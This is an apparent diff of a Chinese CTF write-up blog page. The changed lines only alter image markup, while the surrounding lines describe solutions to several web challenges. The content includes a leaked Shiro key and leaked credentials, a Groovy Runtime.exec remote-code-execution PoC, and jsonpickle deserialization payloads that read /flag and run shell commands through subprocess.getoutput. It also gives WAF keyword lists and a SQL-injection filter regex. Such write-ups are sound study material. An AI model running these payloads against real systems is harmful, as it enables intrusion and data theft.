@@ -95,20 +95,20 @@
   </div>
   </div><article class="md-text content"><h2 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a><strong>JavaSeri</strong></h2><p><code>基础的shiro反序列化 工具可以一把梭</code></p>
 <p>dirsearch扫出来一个<a target="_blank" rel="noopener" href="http://www.zip,有一堆东西,也有账密/">www.zip,有一堆东西，也有账密</a> sunxiaochuan258 NM$<a href="mailto:L@SBCNM.COM">L@SBCNM.COM</a></p>
-<p><img src="/images/output.png" alt="output" loading="lazy" decoding="async" width="818" height="103"></p>
+<p><a class="article-image" href="/images/output.png" data-fancybox="article" aria-label="查看原图"><img src="/images/output.png" alt="output" loading="lazy" decoding="async" width="818" height="103"></a></p>
 <p>密钥为kPH+bIxk5D2deZiIxcaaaA==</p>
-<p><img src="/images/d9ac322e-f7d6-4fa1-a34b-7706b3c4dcde.png" alt="d9ac322e-f7d6-4fa1-a34b-7706b3c4dcde" loading="lazy" decoding="async" width="1019" height="470"></p>
+<p><a class="article-image" href="/images/d9ac322e-f7d6-4fa1-a34b-7706b3c4dcde.png" data-fancybox="article" aria-label="查看原图"><img src="/images/d9ac322e-f7d6-4fa1-a34b-7706b3c4dcde.png" alt="d9ac322e-f7d6-4fa1-a34b-7706b3c4dcde" loading="lazy" decoding="async" width="1019" height="470"></a></p>
 <p>解决</p>
 <h2 id="easyGooGooVVVY-and-RevengeGooGooVVVY"><a href="#easyGooGooVVVY-and-RevengeGooGooVVVY" class="headerlink" title="easyGooGooVVVY and RevengeGooGooVVVY"></a>easyGooGooVVVY and RevengeGooGooVVVY</h2><p>通用poc 出题人waf没换说是</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">this.class.classLoader.loadClass('java.lang.Runtime')</span><br><span class="line">    .getRuntime()</span><br><span class="line">    .exec('env')</span><br><span class="line">    .inputStream</span><br><span class="line">    .text</span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="safe-bank"><a href="#safe-bank" class="headerlink" title="safe_bank"></a><strong>safe_bank</strong></h2><p>前言:这道题很考验python代码审计的能力 需要我们自己去读源码 还有一些小小的坑点</p>
-<p>进入题目有<img src="/images/image-20250729200008253.png" alt="image-20250729200008253" loading="lazy" decoding="async" width="1281" height="303"></p>
+<p>进入题目有<a class="article-image" href="/images/image-20250729200008253.png" data-fancybox="article" aria-label="查看原图"><img src="/images/image-20250729200008253.png" alt="image-20250729200008253" loading="lazy" decoding="async" width="1281" height="303"></a></p>
 <p>和一个注册框 先注册帐号进去看看 提示我需要管理权限 authz=eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogInNhdXkiLCAidHMiOiAxNzUzNzkwNDM5fX0=</p>
 <p>解码得</p>
 <figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"py/object"</span><span class="punctuation">:</span> <span class="string">"__main__.Session"</span><span class="punctuation">,</span> <span class="attr">"meta"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="attr">"user"</span><span class="punctuation">:</span> <span class="string">"sauy"</span><span class="punctuation">,</span> <span class="attr">"ts"</span><span class="punctuation">:</span> <span class="number">1753790439</span><span class="punctuation">}</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p>那我直接user改为admin<img src="/images/image-20250729200241165.png" alt="image-20250729200241165" loading="lazy" decoding="async" width="1450" height="836"></p>
+<p>那我直接user改为admin<a class="article-image" href="/images/image-20250729200241165.png" data-fancybox="article" aria-label="查看原图"><img src="/images/image-20250729200241165.png" alt="image-20250729200241165" loading="lazy" decoding="async" width="1450" height="836"></a></p>
 <p>哇！是管理员面板!难道我win了吗 进去是假的flag(笑嘻了)</p>
 <p>既然是jsonpickle 有jsonpickle反序列化这个知识点 这里我在赛中使用了很多poc 但是因为一些原因都没办法成功打通(悲) </p>
 <p>但是知道一点waf <code>builtins subclasses reduce system subprocess state re code os reduce import __class__ open</code>不行</p>
@@ -127,7 +127,7 @@
 
 <p>3.json要全部都是双引号</p>
 <p>所以这题我认为门槛挺高的,对没有过开发经验的人来说不太友好，很有国外xss的味道了(仅个人观点) 但是最后解出是40多 师傅们很强 期待看到其他师傅的解法</p>
-<p>言归正传 使用上述正确poc后<img src="/images/image-20250729212234808.png" alt="image-20250729212234808" loading="lazy" decoding="async" width="1611" height="623"></p>
+<p>言归正传 使用上述正确poc后<a class="article-image" href="/images/image-20250729212234808.png" data-fancybox="article" aria-label="查看原图"><img src="/images/image-20250729212234808.png" alt="image-20250729212234808" loading="lazy" decoding="async" width="1611" height="623"></a></p>
 <p>要读/readflag</p>
 <p>读文件 <code>{'py/object': 'linecache.getlines', 'py/newargs': ['/flag']}</code></p>
 <p>读源码</p>
@@ -150,7 +150,7 @@
 <p>再去读/app/1.txt</p>
 <figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"py/object"</span><span class="punctuation">:</span> <span class="string">"__main__.Session"</span><span class="punctuation">,</span><span class="attr">"meta"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="attr">"user"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="attr">"py/object"</span><span class="punctuation">:</span> <span class="string">"subprocess.getoutput"</span><span class="punctuation">,</span><span class="attr">"py/newargs"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">"cat /app/1.txt"</span><span class="punctuation">]</span><span class="punctuation">}</span><span class="punctuation">,</span> <span class="attr">"ts"</span><span class="punctuation">:</span> <span class="number">1753446254</span><span class="punctuation">}</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/image-20250729220832624.png" alt="image-20250729220832624" loading="lazy" decoding="async" width="1716" height="550"></p>
+<p><a class="article-image" href="/images/image-20250729220832624.png" data-fancybox="article" aria-label="查看原图"><img src="/images/image-20250729220832624.png" alt="image-20250729220832624" loading="lazy" decoding="async" width="1716" height="550"></a></p>
 <h2 id="我难道不是sql注入天才吗"><a href="#我难道不是sql注入天才吗" class="headerlink" title="我难道不是sql注入天才吗"></a>我难道不是sql注入天才吗</h2><p>挺小众的clickhouse数据库 黑名单是<code>preg_match('/select.*from|\(|or|and|union|except/is',$id)</code></p>
 <p>这里的脚本来源于群里baozongwi师傅提供的 使用了 <code>INTERSECT 子句</code></p>
 <p><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/sql-reference/statements/select/intersect">https://clickhouse.com/docs/zh/sql-reference/statements/select/intersect</a></p>
